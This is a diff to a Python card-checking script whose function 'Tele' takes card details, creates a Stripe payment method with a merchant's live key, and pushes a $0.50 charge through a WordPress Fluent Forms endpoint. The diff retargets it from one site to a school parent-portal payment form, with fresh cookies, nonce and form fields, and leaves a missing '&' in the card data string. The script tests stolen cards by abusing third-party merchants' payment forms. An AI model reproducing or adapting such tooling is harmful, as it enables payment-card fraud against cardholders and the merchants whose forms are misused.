@@ -26,26 +26,25 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F56a6ae254e%3B+stripe-js-v3%2F56a6ae254e%3B+card-element&key=pk_live_51QT3bQFGtPXl9NSAAe8reAydeDRbepxse3034eUXrBPGE4E6Y1cjwQrFLUgza2Q0tjYmmEpDdSaiXYG2F83hkEL700KgPEqVNb'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffd95e0ffd9%3B+stripe-js-v3%2Ffd95e0ffd9%3B+card-element&key=pk_live_51N6gATHEG5XmHMNojyWOS5GfWF4em7PqNE1tTrdW1UFIiuvLOpVhQMJjmTkMsN7rCYqhm9dDhhAHJ8Zq595yjq5s00hWXN3M0X'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '_lscache_vary': 'a9eed09526a27a2bd2b0c8c6c080c93a',
-	    '__stripe_mid': 'cc793db4-35fd-403f-a86a-b4f0793c9a2c73f959',
-	    '__stripe_sid': 'ab327d7c-b30c-4801-81af-cacde7d8d5eaf8fd75',
+	    '__stripe_mid': 'b1eb7380-a220-49f1-a30d-b53b4d1058e8733906',
+	    '__stripe_sid': 'e96502d5-aa5b-4f57-99c4-2048f4ba0f599ee557',
 	}
 	
 	headers = {
-	    'authority': 'nberdine.com',
+	    'authority': 'narhspartnerschools.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_lscache_vary=a9eed09526a27a2bd2b0c8c6c080c93a; __stripe_mid=cc793db4-35fd-403f-a86a-b4f0793c9a2c73f959; __stripe_sid=ab327d7c-b30c-4801-81af-cacde7d8d5eaf8fd75',
-	    'origin': 'https://nberdine.com',
-	    'referer': 'https://nberdine.com/',
+	    # 'cookie': '__stripe_mid=b1eb7380-a220-49f1-a30d-b53b4d1058e8733906; __stripe_sid=e96502d5-aa5b-4f57-99c4-2048f4ba0f599ee557',
+	    'origin': 'https://narhspartnerschools.com',
+	    'referer': 'https://narhspartnerschools.com/parent-portal/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -57,15 +56,21 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1741686483496',
+	    't': '1741932002037',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=9&_fluentform_4_fluentformnonce=4d52d6f593&_wp_http_referer=%2F&dropdown_1=One-time&numeric-field=1.00&custom-payment-amount_1=0.50&numeric-field_1=0.33&input_radio=no&payment_method=stripe&checkbox_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=1140&_fluentform_9_fluentformnonce=ad1e2cf5dc&_wp_http_referer=%2Fparent-portal%2F&dropdown=&repeater_field%5B0%5D%5B%5D=&repeater_field%5B0%5D%5B%5D=2024-2025&names%5Bfirst_name%5D=&names%5Blast_name%5D=&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '4',
+	    'form_id': '9',
 	}
 	
-	r2 = requests.post('https://nberdine.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
+	r2 = requests.post(
+	    'https://narhspartnerschools.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
+	)
 	
 	return (r2.json())
